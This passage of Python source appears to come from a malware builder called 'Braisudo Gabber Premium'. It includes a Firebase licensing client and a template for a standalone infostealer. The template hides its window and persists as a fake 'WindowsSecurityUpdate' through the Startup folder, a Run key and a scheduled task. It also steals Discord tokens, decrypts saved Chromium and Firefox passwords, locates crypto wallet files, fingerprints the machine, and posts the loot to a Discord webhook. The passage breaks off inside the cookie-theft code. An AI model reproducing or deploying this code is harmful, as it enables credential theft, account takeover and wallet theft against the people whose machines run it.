        return dict(default)

    @staticmethod
    def _write(path, data):
        try:
            with open(path, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=4)
        except Exception:
            pass

    def save_config(self):
        self._write(CONFIG_FILE, self.config)

    def save_session(self):
        self._write(SESSION_FILE, self.session)

    def save_config_debounced(self, host=None, delay=400):
        host = host or self._host
        if host is None:
            self.save_config()
            return
        try:
            if self._job:
                host.after_cancel(self._job)
        except Exception:
            pass
        try:
            self._job = host.after(delay, self.save_config)
        except Exception:
            self.save_config()


class FirebaseError(Exception):
    pass


class Firebase:
    def __init__(self, url, timeout=12):
        self.base = url.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "BraisudoGabberPremium/5.3",
            "Accept": "application/json",
        })
        self._cache = {}
        self._cache_ttl = 1.5

    @staticmethod
    def _key(part):
        return urllib.parse.quote(str(part), safe="")

    def _request(self, method, path, payload=None):
        url = f"{self.base}/{path}.json"
        try:
            r = self.session.request(method, url, json=payload, timeout=self.timeout)
        except requests.exceptions.RequestException as e:
            raise FirebaseError(
                f"No se pudo contactar con la base de datos ({e.__class__.__name__})")
        if r.status_code not in (200, 204):
            raise FirebaseError(f"Error HTTP {r.status_code}")
        try:
            return r.json()
        except ValueError:
            return None

    def _invalidate(self, *prefixes):
        for key in list(self._cache.keys()):
            if any(key.startswith(p) for p in prefixes):
                self._cache.pop(key, None)

    def get(self, path, cached=False):
        if cached:
            hit = self._cache.get(path)
            if hit and (time.time() - hit[0]) < self._cache_ttl:
                return hit[1]
        value = self._request("GET", path)
        if cached:
            self._cache[path] = (time.time(), value)
        return value

    def put(self, path, payload):
        result = self._request("PUT", path, payload)
        self._invalidate(path.split("/")[0])
        return result

    def patch(self, path, payload):
        result = self._request("PATCH", path, payload)
        self._invalidate(path.split("/")[0])
        return result

    def delete(self, path):
        result = self._request("DELETE", path)
        self._invalidate(path.split("/")[0])
        return result

    def is_maintenance(self):
        value = self.get("maintenance", cached=True)
        if value is None:
            return False
        if isinstance(value, dict):
            return bool(value.get("enabled", False))
        return bool(value)

    def get_license(self, key, cached=False):
        return self.get(f"licenses/{self._key(key)}", cached=cached)

    def get_user(self, username, cached=False):
        return self.get(f"users/{self._key(username.lower())}", cached=cached)

    def create_user(self, username, record):
        self.put(f"users/{self._key(username.lower())}", record)

    def bind_license(self, key, record):
        self.put(f"licenses/{self._key(key)}", record)

    def touch_login(self, username):
        try:
            self.patch(f"users/{self._key(username.lower())}", {"last_login": now_iso()})
        except FirebaseError:
            pass

    def list_licenses(self):
        return self.get("licenses") or {}

    def list_users(self):
        return self.get("users") or {}


# ============ PAYLOAD GENERATOR ============

class PayloadGenerator:
    def __init__(self, store=None):
        self.store = store or LocalStore()
        self.last_error = ""
        self.payload_template = self.get_payload_template()

    # ---- plantilla ----

    def get_payload_template(self):
        return r'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BRAISUDO GABBER PREMIUM v5.3.1 - Standalone Stealer (stdlib only)
Coded by braisudo__ | Discord: https://discord.gg/aRPdy5sUA3
"""

import os
import sys
import json
import time
import base64
import sqlite3
import shutil
import subprocess
import platform
import getpass
import re
import zipfile
import tempfile
import hashlib
import ctypes
import socket
import random
import urllib.request
import urllib.parse
import urllib.error
from datetime import datetime

try:
    import ssl
    _UNVERIFIED = ssl._create_unverified_context()
except Exception:
    ssl = None
    _UNVERIFIED = None

if os.name == "nt":
    import winreg
else:
    winreg = None

IS_WINDOWS = os.name == "nt"
CREATE_NO_WINDOW = 0x08000000 if IS_WINDOWS else 0
RUN_FLAGS = {"creationflags": CREATE_NO_WINDOW} if IS_WINDOWS else {}
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gabber/5.3.1"
DEBUG_LOG = os.path.join(tempfile.gettempdir(), "gabber_debug.log")

WEBHOOK = __WEBHOOK__
PAYLOAD_ID = __PAYLOAD_ID__
MODULES = __MODULES__


def log(msg):
    try:
        with open(DEBUG_LOG, "a", encoding="utf-8") as f:
            f.write("[%s] %s\n" % (datetime.now().strftime("%H:%M:%S"), msg))
    except Exception:
        pass


def run_hidden(*args, **kwargs):
    kwargs.setdefault("stdin", subprocess.DEVNULL)
    for key, value in RUN_FLAGS.items():
        kwargs.setdefault(key, value)
    return subprocess.run(*args, **kwargs)


def _urlopen(req, timeout):
    """urlopen con reintento sin verificar SSL si fallan los certificados."""
    try:
        return urllib.request.urlopen(req, timeout=timeout)
    except urllib.error.HTTPError:
        raise
    except Exception:
        if _UNVERIFIED is not None:
            return urllib.request.urlopen(req, timeout=timeout, context=_UNVERIFIED)
        raise


def http_get(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
        with _urlopen(req, timeout) as r:
            return r.read().decode("utf-8", "ignore")
    except Exception as e:
        log("http_get %s -> %s" % (url, e))
        return ""


def _status(req, timeout):
    try:
        with _urlopen(req, timeout) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception as e:
        log("request -> %s" % e)
        return 0


def _pip(pkgs):
    try:
        exe = sys.executable if not getattr(sys, "frozen", False) else None
        if exe is None:
            for name in ("python", "py"):
                exe = shutil.which(name)
                if exe:
                    break
        if not exe:
            return False
        subprocess.check_call([exe, "-m", "pip", "install", *pkgs, "-q"],
                              stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL, **RUN_FLAGS)
        return True
    except Exception:
        return False


# ============ WMIC / POWERSHELL CIM HELPER ============

def _wmic(query, fallback_ps=None):
    try:
        out = run_hidden(query, shell=True, capture_output=True, text=True).stdout
        lines = [l.strip() for l in out.split('\n') if l.strip()]
        if len(lines) > 1:
            return lines[1:]
    except Exception:
        pass
    if fallback_ps:
        try:
            out = run_hidden(['powershell', '-NoProfile', '-NonInteractive',
                              '-Command', fallback_ps],
                             capture_output=True, text=True).stdout
            return [l.strip() for l in out.split('\n') if l.strip()]
        except Exception:
            pass
    return []


# ============ DPAPI ============

def _dpapi_decrypt(data):
    if not IS_WINDOWS or not data:
        return None
    try:
        from ctypes import wintypes

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData", wintypes.DWORD),
                        ("pbData", ctypes.POINTER(ctypes.c_char))]

        buffer_in = ctypes.create_string_buffer(bytes(data), len(data))
        blob_in = DATA_BLOB(len(data),
                            ctypes.cast(buffer_in, ctypes.POINTER(ctypes.c_char)))
        blob_out = DATA_BLOB()
        if ctypes.windll.crypt32.CryptUnprotectData(
                ctypes.byref(blob_in), None, None, None, None, 0,
                ctypes.byref(blob_out)):
            result = ctypes.string_at(blob_out.pbData, blob_out.cbData)
            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
            return result
    except Exception:
        pass
    return None


def _triple_des():
    try:
        from cryptography.hazmat.primitives.ciphers import algorithms
        if hasattr(algorithms, "TripleDES"):
            return algorithms.TripleDES
    except Exception:
        pass
    try:
        from cryptography.hazmat.decrepit.ciphers.algorithms import TripleDES
        return TripleDES
    except Exception:
        return None


# ============ STEALTH & PERSISTENCE ============

_MUTEX_HANDLE = None


def hide_console():
    if not IS_WINDOWS:
        return
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        ctypes.windll.kernel32.FreeConsole()
    except Exception:
        pass


def add_persistence():
    try:
        frozen = getattr(sys, "frozen", False)
        target = sys.executable if frozen else os.path.abspath(__file__)
        if not os.path.exists(target):
            return

        startup = os.path.join(os.getenv("APPDATA", ""), "Microsoft", "Windows",
                               "Start Menu", "Programs", "Startup")
        if os.path.isdir(startup):
            try:
                if frozen:
                    shutil.copy2(target, os.path.join(startup, "WindowsSecurityUpdate.exe"))
                else:
                    shutil.copy2(target, os.path.join(startup, "WindowsSecurityUpdate.py"))
            except Exception:
                pass

        if frozen:
            run_cmd = target
        else:
            pyw = sys.executable
            if pyw.lower().endswith("python.exe"):
                pyw = pyw[:-10] + "pythonw.exe"
            run_cmd = '"%s" "%s"' % (pyw, target)

        if winreg is not None:
            try:
                hkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                      r"Software\Microsoft\Windows\CurrentVersion\Run",
                                      0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(hkey, "WindowsSecurityUpdate", 0, winreg.REG_SZ, run_cmd)
                winreg.CloseKey(hkey)
            except Exception:
                pass

        try:
            run_hidden('schtasks /create /tn "WindowsSecurityUpdate" /tr "%s" '
                       '/sc onlogon /f' % run_cmd, shell=True, capture_output=True)
        except Exception:
            pass
    except Exception:
        pass


def check_mutex():
    global _MUTEX_HANDLE
    try:
        import win32event, win32api, winerror
        _MUTEX_HANDLE = win32event.CreateMutex(None, False, "Global\\BRAISUDO_GABBER_V53")
        if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
            return False
        return True
    except Exception:
        return True


# ============ ENVÍO ============

COLOR_GREEN = 0x00ff9d
COLOR_CYAN = 0x00e5ff
COLOR_MAGENTA = 0xff2bd6
COLOR_AMBER = 0xffb020
COLOR_PURPLE = 0x7c5cff
COLOR_RED = 0xff4d6d


class Sender:
    def __init__(self, webhook):
        self.webhook = webhook
        self.sent = 0
        self.failed = 0

    def _post(self, payload, timeout=20):
        body = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(
            self.webhook, data=body, method="POST",
            headers={"Content-Type": "application/json", "User-Agent": USER_AGENT})
        return _status(req, timeout)

    def send_text(self, text):
        text = str(text).replace("\r\n", "\n")
        if not text:
            text = "(vacio)"
        chunks = [text[i:i + 1800] for i in range(0, len(text), 1800)]
        for chunk in chunks:
            status = self._post({"content": "```\n" + chunk + "\n```"})
            if status in (200, 204):
                self.sent += 1
            else:
                self.failed += 1
                self._post({"content": chunk})
            time.sleep(0.35)

    def send_embed(self, title, description="", fields=None, color=COLOR_CYAN,
                   footer=""):
        """Acepta fields como tuplas de 2 (nombre, valor) o 3 (nombre, valor, inline)."""
        embed = {"title": str(title)[:250], "color": color}
        if description:
            embed["description"] = str(description)[:4000]
        if fields:
            clean = []
            for f in fields:
                if not f:
                    continue
                name = f[0]
                value = f[1] if len(f) > 1 else "-"
                inline = f[2] if len(f) > 2 else True
                clean.append({
                    "name": str(name)[:250] or "-",
                    "value": (str(value)[:1000] or "-"),
                    "inline": bool(inline)})
            if clean:
                embed["fields"] = clean[:25]
        if footer:
            embed["footer"] = {"text": str(footer)[:2000]}
        status = self._post({"embeds": [embed]})
        if status in (200, 204):
            self.sent += 1
        else:
            self.failed += 1
        time.sleep(0.35)

    def send_section(self, emoji, title, content):
        """Envia una categoria en su PROPIO mensaje, claramente separada."""
        text = str(content).replace("\r\n", "\n")
        if not text:
            text = "(vacio)"
        head = "%s  **%s**\n%s\n" % (emoji, title, "-" * 32)
        chunks = [text[i:i + 1650] for i in range(0, len(text), 1650)] or [""]
        for idx, chunk in enumerate(chunks):
            if idx == 0:
                prefix = head
            else:
                prefix = "%s  **%s** (cont. %d)\n%s\n" % (
                    emoji, title, idx + 1, "-" * 32)
            status = self._post({"content": prefix + "```\n" + chunk + "\n```"})
            if status in (200, 204):
                self.sent += 1
            else:
                self.failed += 1
                self._post({"content": prefix + chunk})
            time.sleep(0.4)

    def send_file(self, path, filename, content=""):
        try:
            boundary = "----GabberBoundary%d" % random.randint(10 ** 8, 10 ** 9)
            head = b""
            if content:
                head += ("--%s\r\nContent-Disposition: form-data; name=\"content\""
                         "\r\n\r\n%s\r\n" % (boundary, content)).encode("utf-8")
            head += ("--%s\r\nContent-Disposition: form-data; name=\"file\"; "
                     "filename=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n"
                     % (boundary, filename)).encode("utf-8")
            tail = ("\r\n--%s--\r\n" % boundary).encode("utf-8")

            with open(path, "rb") as f:
                data = f.read()

            body = head + data + tail
            req = urllib.request.Request(
                self.webhook, data=body, method="POST",
                headers={"Content-Type": "multipart/form-data; boundary=" + boundary,
                         "User-Agent": USER_AGENT})
            status = _status(req, 240)
            log("send_file %s -> %s" % (filename, status))
            if status in (200, 204):
                self.sent += 1
                return True
            self.failed += 1
            return False
        except Exception as e:
            log("send_file error: %s" % e)
            self.failed += 1
            return False


# ============ SYSTEM INFORMATION ============

def get_system_info():
    info = []
    info.append("=" * 60)
    info.append("SYSTEM INFORMATION")
    info.append("=" * 60)
    info.append("PC Name: " + str(platform.node()))
    info.append("Username: " + str(getpass.getuser()))
    info.append("OS: " + str(platform.system()) + " " + str(platform.release()))
    info.append("Version: " + str(platform.version()))
    info.append("Architecture: " + str(platform.machine()))

    ip = http_get("https://api.ipify.org")
    if not ip:
        ip = http_get("http://api.ipify.org")
    if ip:
        info.append("External IP: " + ip.strip())
        geo_raw = http_get("http://ip-api.com/json/" + ip.strip())
        if geo_raw:
            try:
                geo = json.loads(geo_raw)
                info.append("Country: " + str(geo.get("country", "Unknown")))
                info.append("City: " + str(geo.get("city", "Unknown")))
                info.append("ISP: " + str(geo.get("isp", "Unknown")))
                info.append("Lat/Lon: %s, %s" % (geo.get("lat", "N/A"), geo.get("lon", "N/A")))
            except Exception:
                pass

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info.append("Local IP: " + s.getsockname()[0])
        s.close()
    except Exception:
        pass

    hwid_data = platform.node() + getpass.getuser() + platform.system() + platform.machine()
    info.append("HWID: " + hashlib.sha256(hwid_data.encode()).hexdigest()[:16])

    try:
        cpu = _wmic('wmic cpu get name', '(Get-CimInstance Win32_Processor).Name')
        if cpu:
            info.append("CPU: " + cpu[0])
        cores = _wmic('wmic cpu get NumberOfCores',
                      '(Get-CimInstance Win32_Processor).NumberOfCores')
        if cores:
            info.append("CPU Cores: " + cores[0])
    except Exception:
        info.append("CPU: " + str(platform.processor()))

    try:
        caps = _wmic('wmic memorychip get capacity',
                     '(Get-CimInstance Win32_PhysicalMemory).Capacity')
        total_ram = sum(int(x) for x in caps if x.isdigit()) / (1024 ** 3)
        if total_ram:
            info.append("RAM: %.2f GB" % total_ram)
    except Exception:
        pass

    try:
        gpu = _wmic('wmic path win32_VideoController get name',
                    '(Get-CimInstance Win32_VideoController).Name')
        if gpu:
            info.append("GPU: " + gpu[0])
    except Exception:
        pass

    try:
        info.append("Disks:")
        disk_lines = _wmic(
            'wmic logicaldisk where drivetype=3 get DeviceID,Size,FreeSpace',
            '(Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3") | '
            'ForEach-Object { "$($_.DeviceID) $($_.Size) $($_.FreeSpace)" }')
        for line in disk_lines:
            parts = line.split()
            if len(parts) >= 3 and parts[0].endswith(":"):
                try:
                    info.append("  %s: %d GB total, %d GB free" % (
                        parts[0], int(parts[1]) // (1024 ** 3), int(parts[2]) // (1024 ** 3)))
                except Exception:
                    pass
    except Exception:
        pass

    try:
        key = _wmic('wmic path softwarelicensingservice get OA3xOriginalProductKey',
                    '(Get-CimInstance SoftwareLicensingService).OA3xOriginalProductKey')
        if key and key[0]:
            info.append("Windows Key: " + key[0])
    except Exception:
        pass

    try:
        av_list = []
        av_processes = ["MsMpEng", "avp", "avast", "avg", "norton", "mcafee",
                        "eset", "bitdefender", "kaspersky"]
        tasklist = run_hidden('tasklist', shell=True, capture_output=True, text=True).stdout or ""
        for proc in av_processes:
            if proc.lower() in tasklist.lower():
                av_list.append(proc)
        if av_list:
            info.append("Antivirus: " + ", ".join(av_list))
    except Exception:
        pass

    try:
        info.append("Installed Programs (Top 20):")
        if winreg is not None:
            prog_list = []
            for root_key in (r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                             r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"):
                try:
                    hkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, root_key)
                    count = winreg.QueryInfoKey(hkey)[0]
                except Exception:
                    continue
                for i in range(count):
                    try:
                        sub = winreg.EnumKey(hkey, i)
                        sk = winreg.OpenKey(hkey, sub)
                        name = winreg.QueryValueEx(sk, "DisplayName")[0]
                        if name and name not in prog_list:
                            prog_list.append(name)
                    except Exception:
                        pass
            for p in prog_list[:20]:
                info.append("  - " + p)
    except Exception:
        pass

    try:
        info.append("Running Processes (Top 10):")
        processes = run_hidden('tasklist /nh', shell=True, capture_output=True, text=True).stdout or ""
        for line in processes.split('\n')[:10]:
            if line.strip():
                info.append("  " + line.strip())
    except Exception:
        pass

    try:
        uptime = _wmic('wmic os get lastbootuptime',
                       '(Get-CimInstance Win32_OperatingSystem).LastBootUpTime')
        if uptime and uptime[0]:
            info.append("Last Boot: " + uptime[0])
    except Exception:
        pass

    return "\n".join(info)


# ============ DISCORD TOKENS ============

TOKEN_PATTERNS = [
    re.compile(rb"mfa\.[A-Za-z0-9_-]{80,110}"),
    re.compile(rb"[A-Za-z0-9_-]{24,28}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,45}"),
]


def _discord_leveldb_dirs():
    dirs = []
    appdata = os.environ.get("APPDATA", "")
    localappdata = os.environ.get("LOCALAPPDATA", "")

    for name in ("Discord", "discord", "DiscordPTB", "discordptb",
                 "DiscordCanary", "discordcanary", "Lightcord", "discorddevelopment"):
        p = os.path.join(appdata, name, "Local Storage", "leveldb")
        if os.path.isdir(p):
            dirs.append(p)

    roots = [
        os.path.join(localappdata, "Google", "Chrome", "User Data"),
        os.path.join(localappdata, "Google", "Chrome Beta", "User Data"),
        os.path.join(localappdata, "Microsoft", "Edge", "User Data"),
        os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
        os.path.join(localappdata, "Vivaldi", "User Data"),
        os.path.join(localappdata, "Chromium", "User Data"),
        os.path.join(appdata, "Opera Software", "Opera Stable"),
        os.path.join(appdata, "Opera Software", "Opera GX Stable"),
    ]
    for root in roots:
        if not os.path.isdir(root):
            continue
        try:
            for name in os.listdir(root):
                p = os.path.join(root, name, "Local Storage", "leveldb")
                if os.path.isdir(p):
                    dirs.append(p)
        except Exception:
            pass
        p = os.path.join(root, "Local Storage", "leveldb")
        if os.path.isdir(p):
            dirs.append(p)
    return dirs


def _read_leveldb_blob(folder):
    try:
        files = os.listdir(folder)
    except Exception:
        return b""
    tmp = tempfile.mkdtemp(prefix="gabber_ldb_")
    chunks = []
    try:
        for name in files:
            if not name.endswith((".ldb", ".log")):
                continue
            src = os.path.join(folder, name)
            dst = os.path.join(tmp, name)
            try:
                shutil.copy2(src, dst)
            except Exception:
                try:
                    with open(src, "rb") as f:
                        data = f.read()
                    with open(dst, "wb") as f:
                        f.write(data)
                except Exception:
                    continue
            try:
                with open(dst, "rb") as f:
                    chunks.append(f.read())
            except Exception:
                pass
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    return b"\n".join(chunks)


def _discord_me(token):
    try:
        req = urllib.request.Request("https://discord.com/api/v9/users/@me",
                                     headers={"Authorization": token,
                                              "User-Agent": USER_AGENT})
        with _urlopen(req, 8) as r:
            return json.loads(r.read().decode("utf-8", "ignore"))
    except Exception:
        return None


def get_discord_tokens():
    found = []
    blobs = []
    for folder in _discord_leveldb_dirs():
        blob = _read_leveldb_blob(folder)
        if not blob:
            continue
        blobs.append(blob)
        for pattern in TOKEN_PATTERNS:
            for match in pattern.findall(blob):
                token = match.decode("utf-8", "ignore")
                if token not in found:
                    found.append(token)

    for blob in blobs:
        for match in set(re.findall(rb"[A-Za-z0-9+/]{80,600}={0,2}", blob)):
            if len(match) % 4:
                continue
            try:
                decoded = base64.b64decode(match)
            except Exception:
                continue
            if decoded[:4] != b"\x01\x00\x00\x00":
                continue
            plain = _dpapi_decrypt(decoded)
            if not plain:
                continue
            text = plain.decode("utf-8", "ignore").strip().strip('"')
            raw = text.encode("utf-8", "ignore")
            for pattern in TOKEN_PATTERNS:
                if pattern.fullmatch(raw) and text not in found:
                    found.append(text)

    if not found:
        return []

    valid = []
    network_ok = True
    for token in found:
        data = _discord_me(token)
        if data is None:
            network_ok = False
            break
        valid.append({
            "token": token,
            "username": data.get("username", "Unknown"),
            "email": data.get("email", "Unknown"),
            "phone": data.get("phone", "None"),
            "nitro": data.get("premium_type", 0),
            "verified": data.get("verified", False),
            "mfa": data.get("mfa_enabled", False),
        })

    if not valid and not network_ok:
        valid = [{"token": t, "username": "Unknown", "email": "Unknown",
                  "phone": "None", "nitro": 0, "verified": False, "mfa": False}
                 for t in found]
    return valid


def get_discord_text():
    tokens = get_discord_tokens()
    if not tokens:
        return None
    out = ["DISCORD TOKENS", "=" * 50]
    for tk in tokens:
        out.append("Username: %s\nEmail: %s\nToken: %s\nNitro: %s\nVerified: %s\nMFA: %s\n%s"
                   % (tk["username"], tk["email"], tk["token"], tk["nitro"],
                      tk["verified"], tk["mfa"], "-" * 40))
    return "\n".join(out)


# ============ BROWSERS ============

BROWSER_ROOTS = [
    ("Chrome", os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")),
    ("Chrome Beta", os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome Beta\User Data")),
    ("Edge", os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")),
    ("Brave", os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")),
    ("Vivaldi", os.path.expandvars(r"%LOCALAPPDATA%\Vivaldi\User Data")),
    ("Opera", os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable")),
    ("Opera GX", os.path.expandvars(r"%APPDATA%\Opera Software\Opera GX Stable")),
]


def _iter_chromium_profiles(root):
    out = []
    if not os.path.isdir(root):
        return out
    try:
        names = os.listdir(root)
    except Exception:
        return out
    for name in names:
        full = os.path.join(root, name)
        if not os.path.isdir(full):
            continue
        if name == "Default" or name.startswith("Profile ") or \
                name in ("Guest Profile", "System Profile"):
            if any(os.path.exists(os.path.join(full, f))
                   for f in ("Login Data", "Cookies", "History")):
                out.append(full)
    if any(os.path.exists(os.path.join(root, f))
           for f in ("Login Data", "Cookies", "History")):
        out.append(root)
    return out


def _find_local_state(root):
    for candidate in (os.path.join(root, "Local State"),
                      os.path.join(os.path.dirname(root), "Local State")):
        if os.path.exists(candidate):
            return candidate
    return None


def _chromium_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            state = json.load(f)
        enc = base64.b64decode(state["os_crypt"]["encrypted_key"])
        if enc[:5] == b"DPAPI":
            enc = enc[5:]
        return _dpapi_decrypt(enc)
    except Exception:
        return None


def _decrypt_chromium(encrypted, key):
    if not encrypted:
        return ""
    if isinstance(encrypted, str):
        encrypted = encrypted.encode("utf-8", "ignore")
    try:
        if encrypted[:3] in (b"v10", b"v11", b"v12") and key:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            nonce = encrypted[3:15]
            payload = encrypted[15:]
            if len(payload) > 16:
                ct, tag = payload[:-16], payload[-16:]
                try:
                    return AESGCM(key).decrypt(nonce, ct + tag, None).decode("utf-8", "ignore")
                except Exception:
                    pass
    except Exception:
        pass
    try:
        plain = _dpapi_decrypt(encrypted)
        if plain is not None:
            return plain.decode("utf-8", "ignore")
    except Exception:
        pass
    return ""


def get_wallets():
    wallets = []
    wallet_data = {}
    wallet_paths = {
        "Exodus": os.path.expandvars(r"%APPDATA%\Exodus"),
        "Atomic": os.path.expandvars(r"%APPDATA%\atomic"),
        "Trust Wallet": os.path.expandvars(r"%APPDATA%\Trust Wallet"),
        "Coinbase": os.path.expandvars(r"%APPDATA%\Coinbase"),
        "Electrum": os.path.expandvars(r"%APPDATA%\Electrum"),
        "Bitcoin Core": os.path.expandvars(r"%APPDATA%\Bitcoin"),
        "Ethereum Wallet": os.path.expandvars(r"%APPDATA%\Ethereum"),
        "Binance": os.path.expandvars(r"%APPDATA%\Binance"),
        "KuCoin": os.path.expandvars(r"%APPDATA%\KuCoin"),
        "Ledger Live": os.path.expandvars(r"%APPDATA%\Ledger Live"),
        "Trezor": os.path.expandvars(r"%APPDATA%\Trezor"),
        "Monero": os.path.expandvars(r"%APPDATA%\Monero"),
        "Zcash": os.path.expandvars(r"%APPDATA%\Zcash"),
        "Bytecoin": os.path.expandvars(r"%APPDATA%\bytecoin"),
        "Jaxx": os.path.expandvars(r"%APPDATA%\Jaxx"),
        "Guarda": os.path.expandvars(r"%APPDATA%\Guarda"),
        "TronLink": os.path.expandvars(r"%APPDATA%\TronLink"),
    }
    extensions = [
        ("MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
        ("Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
        ("Keplr", "dmkamcknogkgcdfhhbddcghachkejeap"),
        ("Coinbase Wallet", "hnfanknocfeofbddgcijnmhnfnkdnaad"),
        ("TronLink", "ibnejdfjmmkpcnlpebgbjaanbjbbbgg"),
        ("Binance Chain", "fhbohimaelbohpjbbldcngcnapndodjp"),
    ]

    for name, path in wallet_paths.items():
        if os.path.exists(path):
            wallets.append(name)
            found = []
            try:
                for root, _d, files in os.walk(path):
                    for f in files:
                        if f.endswith((".json", ".dat", ".wallet", ".key", ".seed")):
                            found.append(os.path.join(root, f))
                        if len(found) > 10:
                            break
            except Exception:
                pass
            wallet_data[name] = found

    for bname, root in BROWSER_ROOTS:
        if not os.path.isdir(root):
            continue
        for profile in _iter_chromium_profiles(root):
            settings = os.path.join(profile, "Local Extension Settings")
            if not os.path.isdir(settings):
                continue
            for wname, ext_id in extensions:
                ext_path = os.path.join(settings, ext_id)
                if os.path.isdir(ext_path):
                    label = "%s (%s)" % (wname, bname)
                    if label not in wallets:
                        wallets.append(label)
                    found = []
                    try:
                        for f in os.listdir(ext_path):
                            if f.endswith((".ldb", ".log")):
                                found.append(os.path.join(ext_path, f))
                    except Exception:
                        pass
                    wallet_data[label] = found
    return wallets, wallet_data


def get_wallets_text():
    wallets, wallet_data = get_wallets()
    if not wallets:
        return None
    files = []
    for _n, fl in wallet_data.items():
        for f in fl[:5]:
            try:
                if os.path.exists(f) and os.path.getsize(f) < 5 * 1024 * 1024:
                    files.append(f)
            except Exception:
                pass
    text = "CRYPTO WALLETS\n" + "=" * 50 + "\n" + "\n".join(wallets)
    return text, files


def get_browser_passwords():
    lines = []
    for bname, root in BROWSER_ROOTS:
        if not os.path.isdir(root):
            continue
        local_state = _find_local_state(root)
        key = _chromium_key(local_state) if local_state else None
        for profile in _iter_chromium_profiles(root):
            login_db = os.path.join(profile, "Login Data")
            if not os.path.exists(login_db):
                continue
            tmp = os.path.join(tempfile.gettempdir(), "gabber_login_%d.db" % os.getpid())
            try:
                shutil.copy2(login_db, tmp)
                conn = sqlite3.connect(tmp)
                cur = conn.cursor()
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, user, pwd in cur.fetchall():
                    if not user and not pwd:
                        continue
                    lines.append("[%s] %s\n    User: %s\n    Pass: %s\n"
                                 % (bname, url, user, _decrypt_chromium(pwd, key)))
                conn.close()
            except Exception:
                pass
            finally:
                try:
                    os.remove(tmp)
                except Exception:
                    pass

    ff_root = os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles")
    if os.path.isdir(ff_root):
        try:
            profiles = os.listdir(ff_root)
        except Exception:
            profiles = []
        for profile in profiles:
            folder = os.path.join(ff_root, profile)
            logins = os.path.join(folder, "logins.json")
            key_db = os.path.join(folder, "key4.db")
            if not (os.path.exists(logins) and os.path.exists(key_db)):
                continue
            key = _firefox_key(key_db)
            if not key:
                continue
            try:
                with open(logins, "r", encoding="utf-8") as f:
                    data = json.load(f)
                for entry in data.get("logins", []):
                    lines.append("[Firefox] %s\n    User: %s\n    Pass: %s\n" % (
                        entry.get("hostname", "?"),
                        _firefox_decrypt_value(entry.get("encryptedUsername", ""), key),
                        _firefox_decrypt_value(entry.get("encryptedPassword", ""), key)))
            except Exception:
                pass
    return "\n".join(lines) if lines else None


def _firefox_key(key_db_path):
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, modes
    except Exception:
        return None
    TripleDES = _triple_des()
    if TripleDES is None:
        return None
    try:
        conn = sqlite3.connect(key_db_path)
        cur = conn.cursor()
        cur.execute("SELECT item1 FROM metadata WHERE id = 1")
        row = cur.fetchone()
        if not row or not row[0]:
            conn.close()
            return None
        global_salt = row[0]
        cur.execute("SELECT a11, a2 FROM nssPrivate WHERE a11 IS NOT NULL LIMIT 1")
        row = cur.fetchone()
        conn.close()
        if not row or not row[0] or not row[1]:
            return None
        encrypted_key, entry_salt = row[0], row[1]
        hp = hashlib.sha1(global_salt).digest()
        chp = hashlib.sha1(hp + entry_salt).digest()
        k1 = hashlib.pbkdf2_hmac("sha1", chp, entry_salt, 1, 16)
        dec = Cipher(TripleDES(k1), modes.CBC(entry_salt[:8])).decryptor()
        decrypted = dec.update(encrypted_key) + dec.finalize()
        return decrypted[:24]
    except Exception:
        return None


def _firefox_decrypt_value(b64_value, key):
    if not b64_value or not key:
        return ""
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        data = base64.b64decode(b64_value)
        iv, ct = data[:16], data[16:]
        for candidate in (key, key + b"\x00" * (32 - len(key))):
            try:
                dec = Cipher(algorithms.AES(candidate), modes.CBC(iv)).decryptor()
                out = dec.update(ct) + dec.finalize()
                if out and 1 <= out[-1] <= 16:
                    out = out[:-out[-1]]
                text = out.decode("utf-8", "ignore")
                if text and all(32 <= ord(c) < 127 or c == "\t" for c in text):
                    return text
            except Exception:
                continue
        return ""
    except Exception:
        return ""


def get_browser_cookies():
    lines = []
    for bname, root in BROWSER_ROOTS:
        if not os.path.isdir(root):
            continue
        local_state = _find_local_state(root)
        key = _chromium_key(local_state) if local_state else None
        for profile in _iter_chromium_profiles(root):
            cookie_db = os.path.join(profile, "Cookies")
            if not os.path.exists(cookie_db):
                continue
